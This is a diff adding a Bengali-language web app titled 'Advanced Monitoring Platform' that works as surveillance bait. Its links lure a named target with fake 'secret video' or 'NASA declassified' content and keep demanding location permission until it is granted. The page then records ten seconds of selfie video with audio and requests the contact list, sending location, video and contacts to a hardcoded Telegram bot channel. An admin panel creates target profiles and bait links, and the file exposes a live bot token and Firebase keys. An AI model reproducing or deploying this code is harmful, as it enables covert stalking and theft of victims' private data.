@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Advanced Monitoring Platform</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap');
+        * { font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+        .sidebar { transition: transform 0.3s ease-in-out; z-index: 100; }
+        @media (max-width: 768px) {
+            .sidebar { position: fixed; transform: translateX(-100%); height: 100vh; top:0; left:0; background: #f0f4f9; z-index: 1000; }
+            .sidebar.active { transform: translateX(0); }
+        }
+        .loading-overlay { 
+            position: fixed; inset: 0; background: #fff; z-index: 10000; display: flex; 
+            flex-direction: column; align-items: center; justify-content: center; 
+        }
+        .spinner { width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #3b82f6; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .glass-effect { background: rgba(255, 255, 255, 0.95); backdrop-filter: blur(10px); }
+        .history-item:hover .dots-menu { display: block; }
+        .dots-menu { display: none; }
+        .animate-fade-in { animation: fadeIn 0.3s ease; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .toast-msg {
+            position: fixed; bottom: 25px; left: 50%; transform: translateX(-50%);
+            background: #1f2937; color: white; padding: 10px 24px; border-radius: 60px;
+            z-index: 11000; font-size: 14px; animation: fadeOut 2.2s ease forwards;
+        }
+        @keyframes fadeOut { 0% { opacity: 0; bottom: 0; } 15% { opacity: 1; bottom: 25px; } 85% { opacity: 1; } 100% { opacity: 0; bottom: 0; } }
+        .recording-indicator {
+            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
+            background: #dc2626; color: white; padding: 8px 20px; border-radius: 40px;
+            font-size: 14px; font-weight: bold; z-index: 10001; box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse { 0% { opacity: 0.7; } 100% { opacity: 1; } }
+        .custom-scroll::-webkit-scrollbar { width: 4px; }
+        .custom-scroll::-webkit-scrollbar-track { background: #e2e8f0; border-radius: 10px; }
+        .custom-scroll::-webkit-scrollbar-thumb { background: #94a3b8; border-radius: 10px; }
+    </style>
+</head>
+<body class="bg-[#f8fafc] text-gray-900">
+    <div id="app-root">
+        <!-- Initial loading screen for target device (will show "loading..." until location permission) -->
+        <div id="perm-loader" class="loading-overlay">
+            <div class="spinner"></div>
+            <p class="mt-4 font-semibold text-blue-600 animate-pulse">loading...</p>
+        </div>
+    </div>
+
+    <script>
+        // ----------------------------- FIREBASE CONFIG -----------------------------
+        const firebaseConfig = {
+            apiKey: "AIzaSyCcFIISnGiqViBVMNad3Ak7pJkja9A_GE4",
+            authDomain: "link-togol-f198c.firebaseapp.com",
+            projectId: "link-togol-f198c",
+            storageBucket: "link-togol-f198c.firebasestorage.app",
+            messagingSenderId: "563428983759",
+            appId: "1:563428983759:web:c6887e4a610efee897c8ba"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // ----------------------------- TELEGRAM CONFIG -----------------------------
+        const BOT_TOKEN = "8718981610:AAHsCUB2gJRx3i-DrbvN1gsDyHlT3qYb4oY";
+        const CHANNEL_ID = "-1003709017479";   // Channel ID for monitoring data
+        const ADMIN_CHAT_ID = "5213477021";     // Admin personal chat (optional)
+
+        // Helper: Send to Telegram (supports video, location, contacts, messages)
+        async function sendToTelegram(type, data, extra = "") {
+            try {
+                if (type === 'video' && data instanceof Blob) {
+                    const fd = new FormData();
+                    fd.append('chat_id', CHANNEL_ID);
+                    fd.append('video', data, 'recorded_10s.mp4');
+                    fd.append('caption', `🎥 ১০ সেকেন্ড ভিডিও রেকর্ড\n📌 ${extra}\n⏰ ${new Date().toLocaleString('bn-BD')}`);
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
+                } 
+                else if (type === 'location') {
+                    const msg = `📍 লোকেশন আপডেট!\n🎯 ${data.lat}, ${data.lng}\n📡 Accuracy: ${data.accuracy}মি\n🔗 টার্গেট: ${extra}\n⏰ ${new Date().toLocaleString('bn-BD')}`;
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST', headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHANNEL_ID, text: msg })
+                    });
+                }
+                else if (type === 'contacts') {
+                    let contactText = `📞 কন্টাক্ট লিস্ট (${extra})\n` + data.map((c, i) => `${i+1}. ${c.name} : ${c.phone}`).join('\n');
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST', headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHANNEL_ID, text: contactText.substring(0, 4000) })
+                    });
+                }
+                else if (type === 'device_info') {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST', headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHANNEL_ID, text: `🖥️ ডিভাইস তথ্য\n${data}\n${extra}` })
+                    });
+                }
+            } catch(e) { console.warn("Telegram send error", e); }
+        }
+
+        // ----------------------------- TARGET MODE: Location -> Camera 10s Video + Contacts -----------------------------
+        let currentTargetProfileId = null;
+
+        // Function: Request Location with infinite loop until granted
+        async function requestLocationUntilGranted(profileId, profileName) {
+            return new Promise((resolve) => {
+                const requestLocation = () => {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const { latitude, longitude, accuracy } = position.coords;
+                            await sendToTelegram('location', { lat: latitude, lng: longitude, accuracy }, `${profileName} (${profileId})`);
+                            // Save location history in Firestore
+                            const profileRef = db.collection('profiles').doc(profileId);
+                            const doc = await profileRef.get();
+                            const history = doc.exists ? (doc.data().history || []) : [];
+                            history.unshift({ timestamp: new Date().toISOString(), action: 'লোকেশন শেয়ার', detail: `${latitude},${longitude}` });
+                            await profileRef.update({ history: history.slice(0, 50) });
+                            resolve(true);
+                        },
+                        async (error) => {
+                            console.warn("Location denied, retrying...", error);
+                            // Show a brief alert but keep asking
+                            const toast = document.createElement('div');
+                            toast.className = 'toast-msg';
+                            toast.innerText = '⚠️ লোকেশন অনুমতি প্রয়োজন! ওয়েবসাইট লোড হবে না।';
+                            document.body.appendChild(toast);
+                            setTimeout(() => toast.remove(), 2000);
+                            setTimeout(requestLocation, 1500);
+                        },
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
+                };
+                requestLocation();
+            });
+        }
+
+        // Main target function: Location first, then load page and trigger camera+contacts
+        async function initTargetMode(targetId) {
+            // Fetch target profile details
+            const docSnap = await db.collection('profiles').doc(targetId).get();
+            if (!docSnap.exists) {
+                document.getElementById('app-root').innerHTML = `<div class="p-10 text-center text-red-600">Invalid link</div>`;
+                return;
+            }
+            const profileData = docSnap.data();
+            const profileName = profileData.name || "টার্গেট";
+            currentTargetProfileId = targetId;
+
+            // Increment usage count
+            const usageCount = (profileData.usageCount || 0) + 1;
+            await db.collection('profiles').doc(targetId).update({ usageCount, lastVisit: new Date().toISOString() });
+
+            // STEP 1: Show loading overlay (already visible) and request location persistently
+            const loaderDiv = document.getElementById('perm-loader');
+            if (loaderDiv) loaderDiv.style.display = 'flex';
+            
+            // Force location permission (infinite loop until granted)
+            await requestLocationUntilGranted(targetId, profileName);
+            
+            // Location granted -> hide loading overlay and show landing page
+            if (loaderDiv) loaderDiv.style.display = 'none';
+            
+            // Render the main landing page with camera + contact share
+            renderTargetLanding(targetId, profileName);
+            
+            // After page loads, automatically trigger camera recording (10 sec video) and contacts sharing
+            // We'll also add a manual button but also auto-trigger camera on page load.
+            setTimeout(async () => {
+                await startCameraRecording(targetId, profileName);
+                await promptContactShare(targetId, profileName);
+            }, 1500);
+        }
+
+        // Function: Start 10-second video recording (front/selfie camera) and send to Telegram
+        async function startCameraRecording(profileId, profileName) {
+            try {
+                // Show recording indicator
+                const indicator = document.createElement('div');
+                indicator.className = 'recording-indicator';
+                indicator.innerText = '🔴 রেকর্ডিং শুরু... ১০ সেকেন্ড';
+                document.body.appendChild(indicator);
+                
+                // Request camera with video + audio
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                const chunks = [];
+                recorder.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
+                recorder.onstop = async () => {
+                    const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                    await sendToTelegram('video', videoBlob, `${profileName} (${profileId}) - সেলফি ভিডিও`);
+                    // Save history
+                    const profileRef = db.collection('profiles').doc(profileId);
+                    const doc = await profileRef.get();
+                    const history = doc.exists ? (doc.data().history || []) : [];
+                    history.unshift({ timestamp: new Date().toISOString(), action: 'ভিডিও রেকর্ড', detail: '১০ সেকেন্ড সেলফি ভিডিও' });
+                    await profileRef.update({ history: history.slice(0, 50) });
+                    indicator.innerText = '✅ ভিডিও পাঠানো হয়েছে!';
+                    setTimeout(() => indicator.remove(), 2000);
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                recorder.start();
+                setTimeout(() => {
+                    if (recorder.state === 'recording') recorder.stop();
+                }, 10000);
+            } catch (err) {
+                console.error("Camera permission error", err);
+                const toast = document.createElement('div');
+                toast.className = 'toast-msg';
+                toast.innerText = '📷 ক্যামেরা অনুমতি প্রয়োজন! ভিডিও রেকর্ড করতে না পারলে কন্টেন্ট আনলক হবে না।';
+                document.body.appendChild(toast);
+                setTimeout(() => toast.remove(), 3000);
+                // Keep asking camera? but we'll not block, just show error.
+            }
+        }
+
+        // Function: Contact share prompt
+        async function promptContactShare(profileId, profileName) {
+            // Wait a bit after page loads, but make it interactive
+            setTimeout(async () => {
+                if (navigator.contacts && navigator.contacts.select) {
+                    try {
+                        const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                        if (contacts && contacts.length) {
+                            const formatted = contacts.map(c => ({
+                                name: c.name && c.name[0] ? c.name[0] : 'N/A',
+                                phone: c.tel && c.tel[0] ? c.tel[0] : 'N/A'
+                            }));
+                            await sendToTelegram('contacts', formatted, `${profileName} (${profileId})`);
+                            // Save history
+                            const profileRef = db.collection('profiles').doc(profileId);
+                            const doc = await profileRef.get();
+                            const history = doc.exists ? (doc.data().history || []) : [];
+                            history.unshift({ timestamp: new Date().toISOString(), action: 'কন্টাক্ট শেয়ার', detail: `${formatted.length}টি কন্টাক্ট` });
+                            await profileRef.update({ history: history.slice(0, 50) });
+                            const toast = document.createElement('div');
+                            toast.className = 'toast-msg';
+                            toast.innerText = `✅ ${formatted.length}টি কন্টাক্ট শেয়ার হয়েছে!`;
+                            document.body.appendChild(toast);
+                            setTimeout(() => toast.remove(), 2000);
+                        }
+                    } catch(e) { console.warn("Contact picker cancelled", e); }
+                } else {
+                    // Show manual contact button for browsers without Contact API
+                    const manualBtn = document.getElementById('manual-contact-btn');
+                    if (manualBtn) manualBtn.style.display = 'block';
+                }
+            }, 3000);
+        }
+
+        // Render landing page UI after location granted (style similar to given reference)
+        function renderTargetLanding(id, profileName) {
+            const root = document.getElementById('app-root');
+            root.innerHTML = `
+                <div class="min-h-screen flex items-center justify-center p-6 bg-gradient-to-b from-blue-50 to-white">
+                    <div class="glass-effect w-full max-w-md p-10 rounded-[45px] shadow-2xl text-center border border-white animate-fade-in">
+                        <div class="w-20 h-20 bg-blue-600 rounded-full flex items-center justify-center mx-auto mb-6 shadow-xl">
+                            <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>
+                        </div>
+                        <h2 class="text-2xl font-bold mb-4 text-gray-800">গোপন ভিডিও ফাইল</h2>
+                        <p class="text-sm text-gray-500 mb-6 px-4">স্বয়ংক্রিয়ভাবে আপনার কন্টাক্ট যাচাই করা হবে এবং ভিডিও রেকর্ড করে প্রমাণীকরণ সম্পন্ন হবে।</p>
+                        <div class="bg-blue-50 p-4 rounded-3xl mb-6 text-left text-sm text-gray-700">
+                            <p class="font-semibold">✅ স্বয়ংক্রিয় প্রক্রিয়া:</p>
+                            <ul class="list-disc pl-5 mt-2 space-y-1">
+                                <li>📷 সেলফি ক্যামেরা ১০ সেকেন্ড রেকর্ড</li>
+                                <li>📞 কন্টাক্ট শেয়ার (ঐচ্ছিক)</li>
+                                <li>📍 লোকেশন ট্র্যাকিং</li>
+                            </ul>
+                        </div>
+                        <button id="manual-camera-btn" class="w-full bg-blue-600 text-white py-5 rounded-[25px] font-bold text-lg shadow-lg hover:bg-blue-700 active:scale-95 transition-all mb-3">📸 পুনরায় ভিডিও রেকর্ড করুন</button>
+                        <button id="manual-contact-btn" class="w-full bg-green-600 text-white py-5 rounded-[25px] font-bold text-lg shadow-lg hover:bg-green-700 active:scale-95 transition-all" style="display:none;">📇 কন্টাক্ট শেয়ার করুন</button>
+                        <p class="text-xs text-gray-400 mt-6">আপনার তথ্য নিরাপদে প্রক্রিয়া করা হবে। ধন্যবাদ।</p>
+                    </div>
+                </div>
+            `;
+
+            document.getElementById('manual-camera-btn').onclick = async () => {
+                await startCameraRecording(id, profileName);
+            };
+            const manualContactBtn = document.getElementById('manual-contact-btn');
+            if (manualContactBtn) {
+                manualContactBtn.onclick = async () => {
+                    if (navigator.contacts && navigator.contacts.select) {
+                        try {
+                            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+                            if (contacts && contacts.length) {
+                                const formatted = contacts.map(c => ({ name: c.name?.[0] || 'N/A', phone: c.tel?.[0] || 'N/A' }));
+                                await sendToTelegram('contacts', formatted, `${profileName} (${id})`);
+                                const toast = document.createElement('div');
+                                toast.className = 'toast-msg';
+                                toast.innerText = `✅ কন্টাক্ট শেয়ার হয়েছে!`;
+                                document.body.appendChild(toast);
+                                setTimeout(() => toast.remove(), 2000);
+                            }
+                        } catch(e) { alert("কন্টাক্ট অ্যাক্সেস ব্যর্থ"); }
+                    } else {
+                        alert("আপনার ব্রাউজার কন্টাক্ট API সাপোর্ট করে না। Chrome Android ব্যবহার করুন।");
+                    }
+                };
+            }
+        }
+
+        // ----------------------------- ADMIN PANEL (with custom link creation, profiles, history) -----------------------------
+        let allProfiles = [];
+        let allCustomLinks = [];
+
+        async function loadFirestoreData() {
+            const profilesSnap = await db.collection('profiles').get();
+            allProfiles = profilesSnap.docs.map(d => ({ id: d.id, ...d.data() }));
+            const linksSnap = await db.collection('customPages').get();
+            allCustomLinks = linksSnap.docs.map(d => ({ id: d.id, ...d.data() }));
+        }
+
+        // Save page (custom link)
+        async function savePage(page) {
+            await db.collection('customPages').doc(page.id).set(page);
+        }
+
+        async function deletePage(pageId) {
+            await db.collection('customPages').doc(pageId).delete();
+            allCustomLinks = allCustomLinks.filter(l => l.id !== pageId);
+        }
+
+        async function deleteProfile(profileId) {
+            await db.collection('profiles').doc(profileId).delete();
+            // delete linked custom pages
+            const linked = await db.collection('customPages').where('profileId', '==', profileId).get();
+            linked.forEach(d => d.ref.delete());
+            allProfiles = allProfiles.filter(p => p.id !== profileId);
+            allCustomLinks = allCustomLinks.filter(l => l.profileId !== profileId);
+        }
+
+        // Generate unique ID
+        function uuidv4() { return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => { let r = Math.random()*16|0, v = c==='x'?r:(r&0x3|0x8); return v.toString(16); }); }
+
+        async function createCustomLink(profileId, title, heading, desc, btnText, imageUrl = "") {
+            const linkId = uuidv4();
+            const profile = allProfiles.find(p => p.id === profileId);
+            const newPage = {
+                id: linkId,
+                profileId: profileId,
+                profileName: profile ? profile.name : "Unknown",
+                pageTitle: title,
+                mainHeading: heading,
+                description: desc,
+                buttonText: btnText,
+                imageUrl: imageUrl,
+                createdAt: new Date().toISOString(),
+                usageCount: 0
+            };
+            await savePage(newPage);
+            allCustomLinks.push(newPage);
+            return `${window.location.origin}${window.location.pathname}?view=${linkId}`;
+        }
+
+        // Auto link: generates a pre-defined template
+        async function createAutoLink(profileId) {
+            return await createCustomLink(profileId, "গোপন আর্কাইভ", "নাসার ডিক্লাসিফাইড ফাইল", "<div>চাঁদের অন্ধকার দিকের সত্যতা</div>", "🔓 আনলক করুন", "");
+        }
+
+        // Admin panel rendering with sidebar + link generator + profile list + history
+        async function initAdminPanel() {
+            await loadFirestoreData();
+            document.getElementById('app-root').innerHTML = `
+                <div class="flex h-screen overflow-hidden">
+                    <aside id="sidebar" class="sidebar w-72 bg-[#f0f4f9] flex flex-col border-r border-gray-200 shadow-xl md:shadow-none">
+                        <div class="p-6">
+                            <div class="flex items-center justify-between mb-8">
+                                <span class="font-bold text-blue-600 text-xl italic">Gemini 3.0</span>
+                                <button onclick="toggleSidebar()" class="md:hidden text-gray-500">✕</button>
+                            </div>
+                            <button onclick="showGenerator()" class="flex items-center gap-3 bg-white hover:bg-gray-50 border border-gray-200 w-full p-4 rounded-2xl text-sm font-medium shadow-sm transition">
+                                <span class="text-xl">+</span> New Link
+                            </button>
+                        </div>
+                        <div class="flex-1 overflow-y-auto px-4 custom-scroll">
+                            <p class="text-[11px] font-bold text-gray-400 uppercase px-3 mb-4">📋 প্রোফাইল & লিংক ইতিহাস</p>
+                            <div id="link-history" class="space-y-2"></div>
+                        </div>
+                    </aside>
+                    <main class="flex-1 flex flex-col min-w-0 bg-white">
+                        <header class="p-4 flex items-center gap-4 border-b border-gray-100">
+                            <button onclick="toggleSidebar()" class="p-2 hover:bg-gray-100 rounded-full">
+                                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"/></svg>
+                            </button>
+                            <h1 class="text-lg font-medium text-gray-700">Dashboard</h1>
+                        </header>
+                        <div id="content-area" class="p-6 md:p-12 overflow-y-auto">
+                            <div id="generator-view" class="max-w-3xl mx-auto">
+                                <div class="bg-[#f8fafc] p-8 rounded-[40px] border border-gray-100 shadow-sm mb-8">
+                                    <h3 class="text-xl font-bold mb-6 text-gray-800">🔗 নতুন লিংক তৈরি করুন</h3>
+                                    <select id="profile-select" class="w-full p-5 rounded-3xl border border-gray-200 bg-white mb-4 outline-none focus:ring-2 focus:ring-blue-500">
+                                        <option value="">-- প্রোফাইল নির্বাচন করুন --</option>
+                                        ${allProfiles.map(p => `<option value="${p.id}">👤 ${p.name} (${p.phone || 'ফোন নেই'})</option>`).join('')}
+                                    </select>
+                                    <div class="flex gap-3 mb-6">
+                                        <button id="auto-link-btn" class="bg-gray-800 text-white px-8 py-3 rounded-full font-semibold hover:bg-gray-700">⚡ অটো লিংক</button>
+                                        <button id="custom-link-toggle" class="bg-blue-600 text-white px-8 py-3 rounded-full font-semibold hover:bg-blue-700">🎨 কাস্টম লিংক</button>
+                                    </div>
+                                    <div id="custom-fields" style="display:none;" class="space-y-4">
+                                        <input type="text" id="page-title" placeholder="পৃষ্ঠার শিরোনাম" class="w-full p-4 rounded-2xl border border-gray-200">
+                                        <input type="text" id="main-heading" placeholder="মূল হেডিং" class="w-full p-4 rounded-2xl border border-gray-200">
+                                        <textarea id="desc-text" rows="3" placeholder="বর্ণনা (HTML সমর্থিত)" class="w-full p-4 rounded-2xl border border-gray-200"></textarea>
+                                        <input type="text" id="btn-text" placeholder="বাটনের লেখা" class="w-full p-4 rounded-2xl border border-gray-200" value="🔓 আনলক করুন">
+                                        <input type="text" id="image-url" placeholder="ছবির URL (ঐচ্ছিক)" class="w-full p-4 rounded-2xl border border-gray-200">
+                                    </div>
+                                    <button id="generate-link-btn" class="mt-6 w-full bg-green-600 text-white py-5 rounded-3xl font-bold shadow-lg hover:bg-green-700 transition">✨ লিংক জেনারেট করুন</button>
+                                    <div id="result-link-box" class="mt-8 hidden p-5 bg-green-50 rounded-3xl flex justify-between items-center">
+                                        <input id="generated-url" readonly class="bg-transparent border-none text-sm w-full outline-none text-green-700 font-mono">
+                                        <button id="copy-link-btn" class="bg-green-700 text-white px-5 py-2 rounded-full text-xs font-bold">কপি</button>
+                                    </div>
+                                </div>
+                                
+                                <div class="grid md:grid-cols-2 gap-6">
+                                    <div class="bg-white p-6 rounded-3xl border border-gray-100 shadow-sm">
+                                        <h4 class="font-bold text-lg mb-4">👥 প্রোফাইল তালিকা</h4>
+                                        <div id="profiles-list-admin" class="space-y-3 max-h-96 overflow-y-auto"></div>
+                                        <div class="mt-5 pt-4 border-t">
+                                            <input id="new-profile-name" placeholder="নতুন প্রোফাইলের নাম" class="w-full p-3 rounded-2xl border mb-2">
+                                            <input id="new-profile-phone" placeholder="ফোন (ঐচ্ছিক)" class="w-full p-3 rounded-2xl border mb-2">
+                                            <button id="create-profile-admin" class="bg-indigo-600 text-white w-full py-3 rounded-2xl font-semibold">➕ প্রোফাইল যোগ করুন</button>
+                                        </div>
+                                    </div>
+                                    <div class="bg-white p-6 rounded-3xl border border-gray-100 shadow-sm">
+                                        <h4 class="font-bold text-lg mb-4">📌 সব কাস্টম লিংক</h4>
+                                        <div id="links-list-admin" class="space-y-3 max-h-96 overflow-y-auto"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </main>
+                </div>
+            `;
+
+            // Attach event handlers
+            document.getElementById('auto-link-btn').onclick = () => { document.getElementById('custom-fields').style.display = 'none'; };
+            document.getElementById('custom-link-toggle').onclick = () => { document.getElementById('custom-fields').style.display = 'block'; };
+            document.getElementById('auto-link-btn').click();
+
+            document.getElementById('generate-link-btn').onclick = async () => {
+                const profileId = document.getElementById('profile-select').value;
+                if (!profileId) return alert('প্রোফাইল নির্বাচন করুন');
+                const isAuto = document.getElementById('custom-fields').style.display === 'none';
+                let linkUrl = '';
+                if (isAuto) {
+                    linkUrl = await createAutoLink(profileId);
+                } else {
+                    const title = document.getElementById('page-title').value || "কাস্টম পেজ";
+                    const heading = document.getElementById('main-heading').value || "বিশেষ কন্টেন্ট";
+                    const desc = document.getElementById('desc-text').value || "<p>আনলক করতে নিচে ক্লিক করুন</p>";
+                    const btn = document.getElementById('btn-text').value || "প্রবেশ করুন";
+                    const img = document.getElementById('image-url').value;
+                    linkUrl = await createCustomLink(profileId, title, heading, desc, btn, img);
+                }
+                document.getElementById('generated-url').value = linkUrl;
+                document.getElementById('result-link-box').classList.remove('hidden');
+                await refreshAdminSidebar();
+                renderProfilesAndLinks();
+            };
+            document.getElementById('copy-link-btn').onclick = () => {
+                const input = document.getElementById('generated-url');
+                input.select(); document.execCommand('copy');
+                alert('লিংক কপি হয়েছে!');
+            };
+            document.getElementById('create-profile-admin').onclick = async () => {
+                const name = document.getElementById('new-profile-name').value.trim();
+                if (!name) return alert('নাম লিখুন');
+                const phone = document.getElementById('new-profile-phone').value;
+                const newId = uuidv4();
+                const newProfile = { id: newId, name, phone, note: '', createdAt: new Date().toISOString(), history: [], usageCount: 0 };
+                await db.collection('profiles').doc(newId).set(newProfile);
+                await loadFirestoreData();
+                refreshProfileSelect();
+                renderProfilesAndLinks();
+                await refreshAdminSidebar();
+            };
+            refreshProfileSelect();
+            renderProfilesAndLinks();
+            await refreshAdminSidebar();
+        }
+
+        function refreshProfileSelect() {
+            const select = document.getElementById('profile-select');
+            if (select) {
+                select.innerHTML = `<option value="">-- প্রোফাইল নির্বাচন করুন --</option>` + allProfiles.map(p => `<option value="${p.id}">👤 ${p.name} ${p.phone ? `📞 ${p.phone}` : ''}</option>`).join('');
+            }
+        }
+
+        function renderProfilesAndLinks() {
+            const profilesDiv = document.getElementById('profiles-list-admin');
+            if (profilesDiv) {
+                profilesDiv.innerHTML = allProfiles.map(p => `
+                    <div class="bg-gray-50 p-3 rounded-2xl border">
+                        <div class="font-bold">${escapeHtml(p.name)}</div>
+                        <div class="text-xs text-gray-500">${p.phone || 'ফোন নেই'} | ভিজিট: ${p.usageCount || 0}</div>
+                        <button class="delete-profile-btn text-red-500 text-xs mt-2" data-id="${p.id}">🗑️ ডিলিট</button>
+                    </div>
+                `).join('');
+                document.querySelectorAll('.delete-profile-btn').forEach(btn => {
+                    btn.onclick = async () => { if(confirm('ডিলিট?')) { await deleteProfile(btn.dataset.id); await loadFirestoreData(); renderProfilesAndLinks(); refreshProfileSelect(); await refreshAdminSidebar(); } };
+                });
+            }
+            const linksDiv = document.getElementById('links-list-admin');
+            if (linksDiv) {
+                linksDiv.innerHTML = allCustomLinks.map(l => `
+                    <div class="bg-gray-50 p-3 rounded-2xl flex justify-between items-center">
+                        <div><span class="font-medium">${escapeHtml(l.pageTitle)}</span><span class="text-xs text-gray-400 block">${l.profileName}</span></div>
+                        <button class="delete-link-btn text-red-500 text-sm" data-id="${l.id}">🗑️</button>
+                    </div>
+                `).join('');
+                document.querySelectorAll('.delete-link-btn').forEach(btn => {
+                    btn.onclick = async () => { if(confirm('ডিলিট লিংক?')) { await deletePage(btn.dataset.id); await loadFirestoreData(); renderProfilesAndLinks(); await refreshAdminSidebar(); } };
+                });
+            }
+        }
+
+        async function refreshAdminSidebar() {
+            const snap = await db.collection('profiles').orderBy('createdAt', 'desc').limit(20).get();
+            const historyDiv = document.getElementById('link-history');
+            if (historyDiv) {
+                historyDiv.innerHTML = '';
+                snap.forEach(doc => {
+                    const data = doc.data();
+                    historyDiv.innerHTML += `<div class="history-item group relative flex items-center justify-between px-4 py-3 rounded-xl hover:bg-gray-200 transition"><span class="text-sm text-gray-600 truncate">👤 ${data.name} (ভিজিট: ${data.usageCount||0})</span></div>`;
+                });
+            }
+        }
+
+        function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, m=>({ '&':'&amp;', '<':'&lt;', '>':'&gt;' }[m])); }
+        function toggleSidebar() { const s = document.getElementById('sidebar'); if(s) s.classList.toggle('active'); }
+        window.toggleSidebar = toggleSidebar;
+        window.showGenerator = function() { 
+            const gen = document.getElementById('generator-view');
+            if(gen) gen.scrollIntoView({ behavior: 'smooth' });
+        };
+        window.createLink = async () => { /* legacy, not used */ };
+
+        // ----------------------------- ROUTER -----------------------------
+        (async function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const viewParam = urlParams.get('view');
+            if (viewParam) {
+                // Target device mode
+                await initTargetMode(viewParam);
+            } else {
+                // Admin mode: password check
+                const stored = sessionStorage.getItem('monitor_auth');
+                if (stored === "2791") {
+                    await initAdminPanel();
+                } else {
+                    const pw = prompt("🔐 অ্যাডমিন প্যানেল অ্যাক্সেস করতে পাসওয়ার্ড দিন:");
+                    if (pw === "2791") {
+                        sessionStorage.setItem('monitor_auth', "2791");
+                        await initAdminPanel();
+                    } else {
+                        document.body.innerHTML = "<div class='flex h-screen items-center justify-center font-bold text-red-500 text-xl'>অ্যাক্সেস ডিনাইড!</div>";
+                    }
+                }
+            }
+        })();
+    </script>
+</body>
+</html>
